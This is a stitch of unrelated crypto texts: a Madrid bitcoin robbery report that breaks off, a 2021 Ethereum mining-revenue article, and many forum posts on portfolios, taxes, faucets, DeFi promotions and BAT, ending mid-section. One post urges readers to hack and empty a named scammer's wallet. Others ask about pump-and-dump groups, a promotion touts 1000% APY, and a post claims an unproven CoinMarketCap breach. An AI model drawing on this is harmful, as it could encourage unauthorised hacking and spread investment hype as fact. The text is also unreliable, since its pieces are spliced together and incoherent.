An American technology entrepreneur has told police of being attacked at home in Madrid by a gang of masked criminals, who he said tortured him with a knife and Taser before fleeing with millions of euros in bitcoin.

Zaryn Dentzel, who in 2006 co-founded Tuenti, a social network once known as the Spanish Facebook, told police that a gang of four or five men forced their way into his flat near the Prado art gallery on Tuesday at about 3pm. After covering the security cameras they tied, bound and gagged Dentzel and squirted a spray in his eyes.

Ethereum has so far put up a tremendous run in 2021. Its price has hit multiple all-time highs this year, cementing it as one of the best digital assets to be invested in for the year. Major upgrades to the network like the London hard fork have seen the project move towards a deflationary mechanism, creating scarcity in the asset by burning one-third of the fees issued on the network.

The ETH mining industry also felt the heat when the Chinese government had begun its crackdown on crypto mining in the middle of the year. Like bitcoin, its mining revenue had been affected by the crackdown. However, ETH did not suffer as much as bitcoin did from this move. Hence, miners of the asset have seen good returns on their activity. The difference has been evident in the mining revenue between bitcoin and ethereum miners.

Ethereum Outpaces Bitcoin Mining

Mining revenues between Ethereum and bitcoin mining show a discrepancy in their figures. For one, Ethereum miners have definitely had the more profitable year out of the two. Although not a very wide gap, it is still a notable difference in the returns from both assets. While ETH miners saw a total of $17 billion in revenue from their mining activities, bitcoin miners only saw $13.6 billion.

Volatility between the two assets has also played into how the figures have turned out. Bitcoin mining is associated with high volatility. Yet, ETH has it beat as the asset with the most volatility. ETH mining volatility sat at a staggering 47% compared to bitcoins 28%. This volatility in daily revenues plays a big role in the revenue figures for ETH miners.



The average daily revenue for BTC mining is $45 million. For ETH, this figure is $56 million. In metrics like average fee percentage of daily revenue and revenue correlation with fees, ETH also recorded higher figures.



ETH Fees Go UP

Since Ethereum miners revenues are largely dependent on fees, the rate of sending transactions on the network greatly affects the mining revenue. As such, ETHs volatile fee nature can play a positive or negative role in the revenue returns of miners. When fees go up, so do the revenue returns for miners go up, and vice versa. Furthermore, ETH miners usually have a short window where they can collect the revenues, represented by the 0.55% fee correlation shown above

This correlation has played in the favor of ETH miners this year. The growing popularity and adoption of decentralized finance and NFTs have seen fees skyrocket on the network. Being largely dependent on fee revenue, miners have benefitted the most from this spike. Despite the fee burn, rewards for miners on the blockchain are up for the year.



Compared to Ethereum, transaction fees on the bitcoin network have remained mostly low since the bull rally ended in April. ETH miner revenues were made up of 53% of fees for the year. Meanwhile, transaction fees only contributed 1% to the total miner revenue for bitcoin.

I was wondering how your portfolios look like such as which coins you have and the weights in % of your portfolio.

How are you allocating your funds to the coins? Do you have a specific strategy or are you just throwing your money in?

Ill start. 41% ETH, 39% BTC, 10% VET and 10% ALGO

The weights of ETH and BTC seem kinda high to me and due to this I was thinking about to convert some of my ETH and BTC in order to add some altcoins to my portfolio. What do you think?

Not looking for financial advice. Just your opinions.

I hope this is the right place for this...

So back in 2011, I came across this thing called bitcoin.  I'm a tech guy so I decided to make mining it a bit of a hobby.  For three years I engaged in a number of mining technologies culminating in buying a mining rig for $600.

It chunked along nicely for a while, dumping its small gains into a local wallet.  Then one day it died.  At the time, BTC was worth about $140.  Since I hadn't mined a whole lot more than I invested I just shelved the project and moved on.

Fast forward 7 years.  As I'm going through my data archives in preparation for a NAS upgrade, I stumbled across my old Bitcoin Core wallet.  Out of curiosity I fired up the client and imported the old wallet.  To my surprise there were several BTC in there that I reclaimed.

Now, I apparently and unexpectedly have multiple 6-figures of USD sitting here in BTC.  It's enough to pay all of my debts including my house.  Enough to cut years off my retirement planning.  

What the hell do I do now?  What are the tax implications?  Who has knowledge in navigating these types of situations?

Help?  Anyone?  (Well, except Nigerian princes)

Anyone else wake up in the middle of the night and check the charts? 

Calculate how much something would be worth in ALGO rather than your fiat currency?

Perhaps a sneaky browse of CoinMarketCap.com while on shift at the fiat mines? Only to close it, and re open it only a few minutes later - *just* in case.

Although I have learned a lot (and earned a lot) in my short time in this wild wonderful world - man has it been crazy! I have definitely developed some unhealthy tendencies which surely have not been good for my overall health. 

Im not even over invested I am quite simply hooked!! Maybe its all the hype this year has brought, but to those of you who can DCA in and go on with their lives, I salute you. To those of you who day trade or swing trade, the size of your cajnes scares me. And to those of you who check the charts once every five minutes. they better be the 30 second charts!

It'd be really cool if there was an interface that would let me use my regular, everyday crypto wallet to sign some text and include it in some machine readable format (like PGP/GPG signatures...bracketed by lines of `=` signs).

And if something (like Metamask) was able to seamlessly recognize, scrape and validate signatures that appear in web documents...giving you say a nice green CSS border and a checkmark that shows the address if you hover over it. "Yes. This was signed by the private key-haver of this address".

Is that a _thing_? I'm crypto-ignorant enough to not be sure, maybe there's a hitch in my reasoning.

Actually, never mind signing... having P2P encryption with the whole world, automatically, just by virtue of having a certain browser plugin would be game-changing.

It might be weak encryption in that sense, even, but who cares. It'd work until it got "hacked". But I would think that would automatically imply Ethereum had been hacked, as it uses the same ...stuff.

Most of the people hate paying taxes, they feel robbed out of their money hating on the government.   
We pay taxes mostly out of fear, so they don't come after us.  
Wrong mindset!  
We all know where taxes go, but still take some things for a sure thing.  
We all live in a modern society, don't we? Well for a modern society to work money must come from somewhere, and if you want to be part of that society - you have to contribute.

You have a loved one that is sick and you want an ambulance to come to your house when you call 911 in the middle of the night? - that comes from taxes.  
You want a firetruck when your house catches on fire? - that comes from taxes.  
You want to have good, clean roads?   
Parks to walk your dog in?   
Playgrounds for your kids to meet other kids and play together? - all that comes from the society paying taxes.   
If you want to be a part of a working society - you have to contribute.  
Change your mindset, it's that simple.

Outside of the perception architecture of taking your salary in crypto, is there any advantage that I am overlooking in place of just purchasing your crypto with the money youre paid with? 

I cant imagine that any of the celebrities that are choosing to do so, EG Aaron Rogers, because they were able to negotiate a salary in BTC? Thus as BTC moves up, they are effectively paid more. 

Does anyone have any best practices if such an option is available or any lessons learned from their experience?

Hey everyone,

I'm new to crypto investing (and investing in general really), and I have a question about APY. 

Is it really the % amount that your money grows after a year? Most staking coins give me an APY of about 5%, which is a monthly interest of about 0.4%.

However, a bank from my country gives a 4% interest per month in a simple saving account (it was a special limited time promotion), which translates to about 50% per year. 

So my questions are: 

1. is my bank's APY insanely high or are this sort of promotions normal? 
2. Are crypto's APY this low? 
3. What is a normal APY while investing or staking?
4. Or, am I misunderstanding APY's completely? 

Thanks all!

At the heels of the 2009 economic recession one of the most historic systems was created as a way to avoid financial institutions serving as a third party to process electronic payments for service fees. Today Bitcoin is ranked 9 among the top assets by market cap on course to overtake some of the biggest corporations in the world.  

As everyone knows most days a new coin is launched. If you ever came up with a coin what would be the name you give to it and why? What is the main purpose of the coin and why did you create it?

Ok, it was meant to happen, and it happened. 

And it sucks!!!

I was checking the market and (don't know why or how) I found myself on the quotations of one of my old shitcoins. Maybe it was not such a shitcoin actually.

I never really believed at the X100, x1000, x10000 narrative. I mean, I know some coins can do it and have done it, but  it was like the lottery: it's real, but not for us, for them, for the winners. Or, sorry for the example, some bad illness: you "can't" have it, until you do.

So it happened: one of my coins did the x100 trick. x180 to be precise. Of course I sold it back in the days: I used it to farm some coins on a DEX, and at the end of the farm I was sure it had some real value and the project semeed valid, but it tanked again and again and in the end I decided to sell it.

Fast forward some months and here we are. I wouldn't have been rich if  I had sold it now, but for once it would have been nice going all the way up instead of -10000 like I'm used to.

And the moral is: once you sell it, forget it.

&amp;#x200B;

TLDR: no, HODL is not always the right thing to do. But in this case, yes.

I've been told by a couple of people on Quora that when a crypto burns some of its float, thereby increasing the price of each coin, the amount of coins you hold is not reduced proportionately (the way it does in a reverse stock split for example). Thought I'd double-check by asking another degenerate online forum, so here's my question to them.

"Are you saying that if you own a certain coin, and it burns 25% of its supply, increasing the value of each coin by 33% (for example, coin X has a float of 100, and a market cap of 100$, meaning each coin costs 1$; it burns 25 of them, the market cap remains 100$, but is now divided across 75 coins: 100/75 = 1.33 1 to 1.33 is a 33% increase), your holdings simply rise that much with no offset?"

Hi everyone.  I'm new to this group, but not to crypto currency.  I do want to let everyone know about a hack with CoinMarketCap, in case you are using the site.  My Lifelock found my login information with coinmarketcap on the blackmarket.  So they've been hacked and they either don't know it or don't want the information to get out.  I notified them this morning and they are denying it.  Take precautions if you use this for watching any coins or using them for anything else.  Change your password, asap!

Everytime I hear about a new coin it turns out I'm super late to the party and then I notice that weeks or months prior, people were already investing. So how does everyone find new coins that are worth investing in? And with so many back and forths on why a coin is good or not, how do you figure out whether to buy in the first place ? I feel like it's somewhat of a gamble. 

I have been hodling doge for some time, polka, eth, and ada but I can't seem to keep up with the new up and coming coins. Any advice ?

&gt; research agency Markteffect researched the investment behaviour among Dutch citizens, and the results are noted. Almost 700,000 people are holding Bitcoin in the Netherlands, which is 5% of the population.  (statistics are noted at the start of April) And almost 3,500,000 people are considering jumping on board. (Source: https://markteffect.nl/nieuws/150/ruim-3-5-miljoen-nederlanders-overwegen-te-investeren-in-bitcoin )

[https://www.abnamro.com/br/en/news/threshold-for-negative-interest-rate-down-to-150-000-euros](https://www.abnamro.com/br/en/news/threshold-for-negative-interest-rate-down-to-150-000-euros)

&gt; From 1 July 2021, ABN AMRO clients in the Netherlands with a total balance of more than 150,000 euros in their bank accounts will pay 0.5% interest on the amount above this threshold. This will apply to both private individuals and business clients. The interest on deposits under 150,000 euros will remain unchanged at 0%. 

[https://www.dutchnews.nl/news/2021/04/rabobank-to-charge-customers-interest-on-savings-over-e100000/](https://www.dutchnews.nl/news/2021/04/rabobank-to-charge-customers-interest-on-savings-over-e100000/)

&gt; Rabobank has become the latest Dutch bank to charge customers if they have savings of above 100,000. The bank will now levy a rate of 0.5% on savings of over 100,000 from July 1. The change, the bank says, will impact on just 4% of its customers. ING and Volksbank have already introduced negative interest on savings above 100,000, while ABN Amro has a limit of 150,000. The move, Rabobank says, has been prompted by continuing low market interest rates.

[https://nltimes.nl/2021/04/11/ing-starts-charging-negative-interest-savings-eu-100000](https://nltimes.nl/2021/04/11/ing-starts-charging-negative-interest-savings-eu-100000)

&gt; ING customers with more than a hundred thousand euros in their account must pay a savings interest of 0.5% on this from 1 July. The bank will then lower the negative interest threshold from  250,000 to  100,000.  
&gt;  
&gt;The negative interest applies to both business and private ING customers with more than  100,000 in their accounts. ING emphasizes that the interest applies per account and not per customer. Spreading money over several (savings) accounts at the bank would thus offer another chance to escape the negative interest rate. On the other hand, there are higher costs per month for holding multiple accounts.

Conclusion: FUCK CENTRAL BANKS :D

We are increasingly seeing Exchanges come under pressure. China is in the process of banning crypto companies, and also the US SEC is constantly tightening the rules for regulating cryptotrading. For me personally, Centralized exchanges are most useful for leverage trading, but now that decentralized exchanges are emerging as realistic options, and as more and more people learn how to use Metamask, Trustwallet, and similar stores, they will only become more popular and commonplace.


Projects currently in that space are:

Project | Marketcap | DEX trading volume

dYdX | $900M | $2.7B

Mango Markets | $325M | ?

bZx Protocol | $143m | ?

Gains Farm | $24m | $19m

Lendefi | $2m | ?

What do you think about leverage trading on DEXs in general? Have you tried it already? Will they take more volume from the big centralized exchanges in future?

I've seen comparisons between the growth of crypto usage and the growth of internet usage, from just the technical users to everyone and their granny using it
What would this level of adoption/usage for crypto actually look like? 

Would we be buying bread with btc (or another coin).
Would phone contracts or house mortgages be done completely on the blockchain? Will new cars be purchased with NFTs?
Are brick and mortar banks phased out completely as everyone controls their finances digitally and individually?

I'm just curious where everyone sees crypto if its/when its adopted to the level the internet is now?

So, I invested some money into IOTX and ASM a couple of weeks ago, they've risen by 82% and 388% respectively. I'm sitting on around 300 which is so damn awesome as a teen, I've made more here than 3 weeks of work at my takeaway. 

My plan is to hodl for a while as neither has reached an ATH, ill periodically invest some into blue-chip coins for the long-term as well as invest in other potential coins I perceive as valuable. Ive staked some money too and im thinking of entering into NFTS, however, i feel the volatility and potential for loss is much greater in that market if you're not already in possession of some good NFTS and for that you need decent speck tech to acquire before others. I was wondering, other than stocks, what else i could branch into with a teenagers budget to make more money?

Love from the UK!

https://www.cnbc.com/2021/11/02/squid-game-token-cost-one-investor-28000-after-coin-plunged.html

&gt;After catching headlines  but before reading the full articles, many of which warned of some red flags around the project  he decided to invest his entire life savings of $28,000 into SQUID, a coin that billed itself as a play-to-earn cryptocurrency.

&gt;Bernard, who says he has a lot of experience in crypto and computers, blames media outlets for his investment in SQUID as well


Saw many people on here blaming articles. Maybe if you read them then this scam would have been mitigated.

Choose your worst feeling, maybe from your experience for example:

1. Selling your coin after holding it for long and then watching it pump
2. Not sending a small ammount first and you picked a wrong wallet. Possibly not yours
3. Thinking about investing in some coin, not doing that,  and then watching it pump
4. Getting error message on your exchange hence **not being able to sell**
5. Investing in a rug
6. Not researching transaction fees and wasting money moving your crypto around 
7.  Losing your hardware wallet, not having a seed phrase written somewhere
8. Losing your book with seed phrases in it
9. Getting scammed 
10. Panic selling
11. All coins are pumping except yours
12. Believing that this is a get rich quick scheme. 
13. Newbie thinking that only thing you should invest in are low price coins
14.  Buying coins for the whole amount dedicated for investment at once rather than DCA
15. Telling someone to sell "that" coin and watching it pump after they do
16.  Thinking you will be successful at day trading, or timing the market

I love that in the last two days Coinbase has listed $LCX and $CRO, because Im not exactly sure what the long term benefit is that theyre expecting. 

On 10/15 they suppressed the price of $NU by roughly 80% for the entire pump, which pissed a lot of people off. 

More recently, they didnt have the liquidity to handle the $SHIB volume, and a lot of people lost a lot of potential profit, which pissed them off.

And now CoinBase is like Hey, heres some more native tokens for some more DEXs, in case you ever realize how badly were screwing you over with fees, and have had enough of our failure to scale our volume capabilities.

CoinBase is the launching point for most people into this sector, and its giving those newcomers exposure to DEXs as well, in case any of them read the info on the two new ones. 

Or $SUSHI. Or $UNI. Or $1inch. 

If a user tired of being abused by the fees and ignored by customer service when things go wrong, the service responsible has shown you the path to greener pastures. 

So now the post title makes sense. 

I have no idea why shes marrying me.

Anyone starting to have second thoughts on any of your long-term holds? 

I was a VET fanboy a few months ago, but now I'm wondering if real-world application will ever turn into real-world profits for my wallet. Long-term, I can see it going up with the market, albeit lagging, but I don't see any of the announced usage having any affect on price.  Same with ACH.  

Sure, we'll make money down the road, but how much are we losing by limiting our ability to buy into more profitable assets?  Is it worth it to you to stick with a project because you want to support the technology even if it means missing out on the moonshots, or even just higher profits with a safer investment?

The first step to earning banano is setting up your own personal wallet. For iPhone and Android users the easiest way to set up a wallet is to simply download [Kalium](https://kalium.banano.cc/). If your using a pc I would recommend [Banano vault](https://vault.banano.cc/).

Now, the easiest way to get your first bananos is to use monkeytalks, simply go to 
[this](https://monkeytalks.cc/), click the faucet button in the top right and enter your banano address from kalium/banano vault. Thats all you have to do, within a few minutes you should now have your first bananos!

My personal favourite way of earning banano is simply being active in the Reddit, discord and telegram groups. The banano community is very generous and tips are sent to active users all the time.

Another faucet to try is [this](https://bananofaucet.cc/), however its not as easy as you will need to link a Reddit account. You will get more bananos from this though. For a full list of banano faucets check [here](https://www.google.co.uk/amp/s/amp.reddit.com/r/banano/comments/npc31y/list_of_banano_faucets/).

Have a spare computer lying around? Well now you can put that to use and start earning bananos with it! Mining banano is different to mining other cryptos as well, your computer power will be used for medical research, the combined team of people mining banano has us to become the biggest contributor to folding@home. To get started mining banano visit 
[here](https://bananominer.com/). 

Another method of mining banano is to run [BoomPow](https://bpow.banano.cc/). This rewards you for providing the POW for nano and banano transactions.

One of the most popular ways of earning banano right now is [jungle tv](https://jungletv.live/). All you need to do is watch the YouTube videos provided and you will start getting payouts.

You will also earn bananos by owning banano nfts, check [this](https://www.publish0x.com/banano/monkeyslots-earn-banano-by-owning-cryptomonkeys-nfts-xjmnqmv?a=QJ0dNjvdLO) site out if interested.

Participating in r/bananojobs can also net you a decent amount of banano.

Looking to gamble? [bananobet](https://bananobet.com) and [nanogames](https://nanogames.io/crash?i=556704&amp;s=&amp;c=) are likely your best bet!

This way isnt free, but if you want a lot you will need to buy them. You can do this on coinex and pancakeswap.

If you know of any other ways of getting free banano please let me know in the comments!

As I learned this by myself a few days ago. **Coinbase Pro is free to use** and you get lower fees than on "regular" Coinbase. It provides more trading options and provides a simpler/lower fee structure. Also you are able to set stol/limit orders.

You aren't able to stake on Coinbase Pro but you can buy and then transfer it to your Coinbase so you still are able to stake. 

If you want to deposit fiat into Coinbase Pro it's faster to just deposit it into the main Coinbase platform and transfer the fiat from there to Coinbase Pro (which is free).

So I have been away from GRIN for a long time ever since I realized that you require a 8GB or greater graphics card to mine the stuff. I have returned and there is some talk about a 51% attack on GRIN but I'm thinking what the hell, you only live once and have setup shop on Slatepacks Market. I have added a free crypto puzzle ARG with a prize for GRIN, I'll purchase your GRIN, I'll give you free game credits and I'm selling a prized NFT for GRIN. How do you feel about the 51% attack if you are holding GRIN? Got any news on the situation?

If you can hack his own wallet, please have at it, and empty his wallet for all the people he has stolen from 0xc9ad3f3317c55b1259777fc5f4891b7c5957bc2f He is a Nigerian, I was able to get this info because he prowls in the bit mart support telegram. I made another account and pretended to be a fresh victim. Teach this guy a lesson for all of us.I have photographic proof of how it all went down.

Hey Reddit!

After the recent debacle of the token which has been talked about enough already, let's call it...hum.... cephalopod amusement, I decided to make an infographic on the concept of risk management. Of course, risk management is just a part of the equation, and doing research on the projects you invest in must not be neglected. 

Nonetheless, risk management is an important tool for any investor and can help you make the right decisions based on your own situation. 

As I'm no financial advisor, or knowledgeable enough to teach you this concept, the information in this infographic is from Binance academy. I am not affiliated with them, but Binance academy articles are just a really great resource to learn. 

If the response is good, I'm planning on creating infographics on other subjects and hopefully helping the community stay safe and well-informed. 

Hope you like it! 

&amp;#x200B;

The atmosphere in the daily yesterday was amazing. The sub was full of happy people.

Why? Loopring.

I truly enjoyed seeing the happiness.

Then there was more happening. A strong hype. It was like a good party for everyone. And the shilling. Today even more so.

At the moment when I go into daily. It feels like loopring holders are shaming the ones who take profit. Calling them new. Paper hands. That they've never seen a proper dip or crash before. That people need to relax and wait for the new ATH. That those who sell will regret it. They will FOMO back in at $5 as if that makes them stupid.

The charts went wild for loopring. A lot bought in, or bought more, or both.

And some people are just in for that. To buy in, make a profit and leave again.

Don't shame them. And why shame them? Out of fear? Because that's what it looks like. The more who sell, the more the price will drop or stay the same. You don't want that. So therefore ridicule those who sell?

We invest. And we take profit. Unless its squid. You invest and you hold your bag against your will.

I am a young man, recently engaged with a baby on the way. As most of you I had some debts to take care of which were a weight I was carrying around for as long as I can remember. To make matters worse all of those were from close friends and relatives.  
Now, I am proud to announce that I cashed out 60% of my portfolio and have paid all my debts!  
I feel much better now, relationships with people close to me are no longer in danger, wifey and I can now feel much safer with our little guy on the way and I still have 40% in the game!

I know some of you might say I did it wrong and I should have waited couple of months before doing this but I felt like I was right on the edge with friends and relatives and couple of months more could be too much to go back.  
Now that it's over I feel like a weight has been lifted off my chest and I can now breath freely!  
Crypto did it for me, made my life and the life of my family better. Hope it has more to give!

P.S. after cashing out I did some alt swapping and I am now 100% in DOT, which by the way just hit a new ATH on Kraken! Woo Hoo!  


edit: I am sorry I have to repost this, for some reason it got deleted. I tried several times reaching out to a moderator to find out what's wrong but couldn't get an answer. After looking at it again I think I had the wrong flair. Hope I've done it right this time, if no, I would greatly appreciate it if I can be contacted to straighten things out. Thanks in advance!

Im talking about big traders not the ones we dont see... but the twitter and youtube ones that show us their 3 month portfolios with atleast $50,000 - most of them have it on Binance. They know the rules pretty well but still keep their money there only to sell it in a few months time. Is it becsuse of the sell-order/stop loss. Or is it normal not to store large amounts in a hww and Im I just being paranoid ? 

Message to the scammers: I am not opening your DMs thank you in advance.

So back in the spring of 2021 maybe 6 months or more ago, I bought $50 worth of shib during to the dog coin hype and now its worth over $500 an i wanna cash it out before i drops any more. However im trying to use changelly or changenow to convert it to bitcoin, however ive found that trying to send the shib from my trust wallet app where its stored is showing me a $60 ETH gas fee. WOW. is there any way to avoid that fee or for it to be lower. if not ill pay it i guess but wanted to make sure im doing this right

ADA is a fantastic stable coin! Its held my investments value at $2 for many tumultuous months now. And its main frontman, near-billionaire Charles Hoskinson, always says things like, who cares about price?! So like any great investment the value is intrinsically based, not with silly, greedy things like numbers. 

And as far as real world uses, you can easily trade ADA for goods and services (so long as you convert to BTc or ETh or dog coins first)! 

Oh and Ethiopia! Theres that to look forward to. 

So much to look forward to!

Hey, 

So I currently only get 20 a month to invest in crypto all at once. I started off by buying ALGO which did amazing. But now I'm only getting a few coins per 20. Which is fine but I did love the thrill of going to buy AlGO one day and to see crazy gains! I was curious if there are any "cheaper" coins that may take off like ALGO did?  I've been looking into VET and ONE which seem great. I do want to say away from shit coins like doge and shib. But I am willing to invest in slightly riskier coins that are dirt cheap 0.001. 

Thanks for taking the time to read and suggest!

Basically the title that how come Kraken doesnt have IOTA and VET?

I wanted to buy some IOTA and VET from kraken (trying to avoid Binance like the plague these days), and realized that Kraken does mot have the two aforementioned coins?

Whats up with that? I understand that Coinbase infamously doesnt list VET, but I expected Kraken to have these fairly reasonable coins. They have a big fan following, loads to people trade them. They arent meme coins (although that might be a positive thing rather than a negative thing these days). 
Both the coins have fees as well (although minimal) so Kraken can earn on them. Although exchanges have their own withdrawal fees regardless, so that cant be the reason anyways.

So what gives? Any idea?

Thank you!

So I get up to pee, it's 3:30am here on the East Coast, I go to check my phone as one does, and wouldn't you know, Elon just tweeted! It's a funny comic of some astronauts landing on the moon and realizing the Vikings had already been there because there's some Viking ship artifact. Hilarious, Elon, so funny!   But then I thought a moment, is there a space Viking coin? Sure enough coin market cap showed me there is! Luckily for me I had a bunch of bnb in my wallet and so on a loof I went ahead and bought an ungodly amount: almost TWO HUNDRED MILLION COINS.

I did it ladies and gentlemen. I saw an Elon tweet, I used my imagination to figure out what might go up as a result, and I profited. I more than quadrupled my money! 25 cents to a dollar!

There are tons of scams out there, but are there any legitimate long time P&amp;D groups that have proven to provide some returns over months, or shall we safely assume they are all scams? Here scam meaning they are just trying to hoard buy ins and then rug, "not lose your money because you got in too late."

I assume the ones that work long term make like 10%-50% possibly? Not the ridiculous promises of 5x-10x etc....

Some past examples would help, thanks!

Hi probably a dumb question but i have some crypto in a blockchain account (ultimately i got this free from a sign up so its not that deep) but im struggling to draw it out to my coinbase (minimum transfer not met) and although i sent one dollar to the account from my bank to make withdrawals possible (over a week ago and its still pending)

what the hell do i actually do to get it out? i seemingly cant deposit nor withdraw or send and its been impossible to get a hold of customer services about these issues. thanks.

I have almost only been burned on FOMO buys. 

These days I almost dont do it anymore. But then that LRC run got me. At least it is not a shitcoin - but still. I should know by now that jumping on a massive pump well on the way usually ends in losses. And now I am sitting here and dont know whether to wait for it to - maybe - go up again or just cut my losses. 

This has happened almost every time I have FOMOed or made a rash decision in crypto. My whole portfolio is very green, and this is exclusively because of my DCA investments in solid projects. But I could definitely have avoided some losses - and heartaches - if I just listened to myself and what we almost all agree on: Dont FOMO. 

Yet here I stand again: Buying high, and selling low.

So lets say it together one more time: Dont FOMO!

Considering the upcoming change to POS in a lot of coins, the fact that mining will only get more difficult in the future as more coins are mined/more people start mining, and the inevitable periodic halvings that will occur in coins which stay on POW, how does the future of mining look? Its still well  worth it currently to spend money to buy a rig for mining, thats obvious. But how much longer will that be the case for?

In the interest of driving up the character count, let me tell you about my awesome situation! I live in a student apartment unaffiliated with my school which charges a flat fee for electricity, and I have a gaming computer with an nvidia GeForce RTX 3080! Im basically getting free crypto. Its pretty sweet.

Hey guys

I've been in crypto for a few years now. Most of my crypto experience has been spent investing in projects which I felt would actually provide utility and be useful in a real world scenario, or at the very least had enough hype to sustain a long term investment.

Recently I was on a TG group that was being raided by a low cap token on poo coin which had just launched and had a market cap of around $5k. I usually stay the hell away from this stuff, but just for the hell of it I bought $100 because I was curious.

Less than an hour later I cashed out $200 of BNB. 

Around that point the token dipped 50%, then stabilised. Again, I really wouldn't risk money on this stuff usually, but I decided to put $500 on it and cashed out around $600 10 mins later.

The next day I checked the chart and saw that the coin had crashed to almost zero. It had gone from a market cap of $5k to $50k, and then back down to $5k again.

I know I got fortunate with my timings, but this has me really curious. If you could invest 100% or 200% of a coins market cap, would this really pump a coin up 5x or more? We all hear about wales manipulating low cap coins, but I always assumed this was a bit more complex then people made out (usual reddit user trying to be a millionaire blaming millionaires for why they're not a millionaire yet). 

If let's say someone bought $10k of a shit coin with a market cap under $5k, would this really be enough to 5x or 10x the token?

P.s 

I'm not advocating pumping and dumping coins. I'm genuinely curious what it takes for wales to manipulate tokens.

Firstly i have to apolygise for my terrible english as its my second language and I'm writing this on my Phone so its trying to correct it back to my native language.

I have very recently started to invest in crypto and I'm going to be completly honest and administration that I dont know that much and invest in it mostly as a way to diversify my portfolio. But the problem is that my familj think that im just flushing money down the drain on scams or that om buying drugs, guns and hookers with my untracable crypro.
So how am i going to explain to them that its more then just a way for anonymus payments and its actually so much more.
If its any help i have invested in 
Btc

So first you need $1000. If you don't have $1000 go get a job right now. Job market is hotter than shilling meme coins in the daily.

Once you have $1000 buy a coin that is going to 10x. Wait for it to 10x then time the top perfectly and sell.

Now take your $10,000 and pick another coin that's going to 10x. Wait for it to 10x then time the top perfectly and sell.

Finally take your $100,000 and pick a third coin that's going to 10x. Wait for it to 10x then time the top perfectly and sell.

Bam..now you're a crypto millionaire. Do whatever you want with the rest of the money after you buy your Lambo.

Oh yeah don't live in the United States or any country that taxes capital gains.

If your still reading... this is not financial advice or ife advice for that matter, this is humor.

I've gotten heavy into Crypto over the last 6 months.  Some of the accounts preach on taking profits, which I agree with.  However non of them give real numbers of examples, it's always just vague "take profits", which I get the whole "not financial advice" line.  


So I've made my own benchmarks to take the emotions out of taking profits and hoping some can speak to if it's a good plan, bad plan if there is a better plan, etc.  


|Xs Gains|Profits taken|
|:-|:-|
|3x|Remove initial investment|
|4x|10% removal|
|5x|10% removal|

This goes on and on.  If my math is right on a $1,000 investment you would be 100% cashed out once the coin hit a 73X.  At that time you would have cashed out $21,000 leaving about $50K on the board had you held, obviously though the thought is that the coin isn't going to 73x straight up.

&amp;#x200B;

Am I taking out too much? too little?  Should I be taking profits every 2x, so 2x, 4x, 6x, then once it hits 10x pump that to every 10x after that so you are taking more of a long position after taking profits?

&amp;#x200B;

Second part:

I like the above strategy for L1 coins, Solana, Polkadot, Avalanche, etc.  Stuff with 1Billion + of Market cap.

When we start talking about altcoins I've heard recommendations that you should be taking profits but in the short term liquidate 100%.  


For Example:

The coin JOE is part of the Avalanche Ecosystem.  You would do something like taking profits but once AVAX hits a 5x or even 10X you should be 100% liquidation JOE because it's most likely hit a 10x 20X already.

&amp;#x200B;

Thought on these lower cap, Altcoins?

&amp;#x200B;

Also if anyone has a spreadsheet that has proven a successful strategy would love to see it!

The United States was founded by rough individuals. They created a government to protect their rights, not to leave them alone. Americans today want the government to violate the rights of others, steal their things, and then give them to them. The home of the free man has become the land of the greedy.

MINING

DFBTC has been online for nodes, BTC cross-chain manufacturing, and pools LP protocols He is a good DEFI product

&amp;#x200B;

The DFBTC poolsLP mining protocol has been started and the apY is 1000%

&amp;#x200B;

It is not a product that requires high returns but is a stable revenue product,  and we hope that users who understand cryptocurrencies can really understand it

Q: DFBTC economic model parameters

A: Our DFBTC economic model is divided into three parts. As you all know, our previous information has explained that DFBTC is BTC cross-chain to other mainchains to increase liquidity and DEFI investment diversity. In our V1 release, we cross-linked to the Ethereum mainline and provided the community and users with a variety of DEFI investment options. First of all, users can choose to manufacture DFBTC through equity. We are the first DAPP in the whole network to anchor digital assets with double interest, and the first DAPP in the whole network to anchor digital assets with 100% decentralization.

Q: What are these three parts?

A: The first part is staking

It can double the interest and the user can get both BTC and AOM

The second part is the guarantee node

The guarantor node has corresponding collateral assets custody bitcoin, and can obtain custody fees and collateral assets income

The third part is borrowing

Users can choose deposit business and loan business. For example, depositing a high-quality asset can earn interest, and lending other assets directly if they need other assets.

&amp;#x200B;

And we're going to have Swap in V1

Directly support the exchange of high-quality cryptographic assets such as BTC-DFBTC-ETH

The details will be explained later in the detailed documentation

FULL CREDIT u/no-Echo3014 w/ Edits to roadmap

 A very popular way to "calculate" a simplistic valuation of a cryptocurrency is by answering three simple questions:

* **"How useful is it?**" or in other words "Why (objectively) would someone hold BAT?"
* **"Does scarcity exist?"** or in other words "If everyone starts buying up a lot of BAT (demand goes up), is there an effect on the remaining supply?"
* **"How do people feel about BAT?"** or "How do people feel about the Brave/BAT team?" or "How often is Brave/BAT hitting it's major goals?"

Let's get started.

**Question One: How Useful is BAT?**

Extremely. The goal of BAT is to completely replace the dumpster fire privacy raiding advertiser-user economy currently in place, which time and time again proves to be a toxic mess.

A brief summary of the BAT business plan:

* Brave has a huge active user base (\~42M active monthly users).
* Brave provides excellent out-of-the-box ad-blocking, tracker-blocking, fingerprinter-blocking, etc. which many of these \~42M users leave active.
* Current model is based on sharing 70% of Ad Revenue back to the Brave Users while Brave retains 30% for development - IMPT NOTE:  A key defining pillar of the metaverse is users ability to earn for participation - Brave has done this since the onset.

A brief list of some future goals beyond Advertising:

* Brave's New and Improved Self Custody Wallet with Swapping will launch later this month with the intent to capture existing Metamask users &amp; new comers to DEFI 
* Brave will reward users in BAT for using their SWAP, creating further buying pressure on BAT
* In time, the Brave's Wallet will act like a centralized HUB for users to transact across the Web seamlessly and only provide identifying information where and when required with digital IDs built in
* The Wallet will host to Creators owned assets (NFTs) that can be sold w/ royalties upon future transactions.  Creators will be the beneficiaries of their work - not big tech platforms.  Again, the metaverse should weight towards supporting those who participate and not the centralized platform (though it does require cash for development and sustainability).

**Question Two: Does Scarcity Exist?**

Absolutely. BAT is capped specifically at 1,500,000,000 coins by design. Because this post is already quite lengthy, I'm going to make this very short.

If the demand for BAT continues to rapidly increase as it has been, it can be expected that available supply will slowly shrink. Therefore, due to the simple law of supply and demand, it can be expected that increasing demand will slowly apply upwards pressure on the price/value of BAT. Additionally, this contributes to reasons why users/investors have incentive to get into BAT right now before the currency really starts seeing widespread adoption online. With the combined expectation of the BAT ecosystem expanding across the Internet and the demonstrable (and probably growing) scarcity of the coin, we are quickly building an excellent case for a high BAT valuation.

**Question Three: How Do People Feel About BAT?**

